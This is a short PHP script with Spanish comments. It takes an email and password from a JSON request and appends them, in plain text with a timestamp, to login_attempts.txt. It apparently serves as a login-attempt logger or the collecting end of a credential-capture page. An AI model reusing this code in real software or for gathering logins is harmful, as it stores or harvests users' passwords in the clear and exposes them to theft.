<?php
// log_attempt.php

// Obtiene el contenido del cuerpo de la solicitud
$input = json_decode(file_get_contents('php://input'), true);

// Verifica si se recibió un email y una contraseña
if (isset($input['email']) && isset($input['password'])) {
    $email = $input['email'];
    $password = $input['password'];
    $timestamp = date('Y-m-d H:i:s'); // Obtiene la fecha y hora actual

    // Escribe el intento en el archivo
    $logFile = 'login_attempts.txt';
    $entry = "Intento de inicio de sesión: Usuario: $email, Contraseña: $password en $timestamp\n";
    file_put_contents($logFile, $entry, FILE_APPEND | LOCK_EX);
}
?>
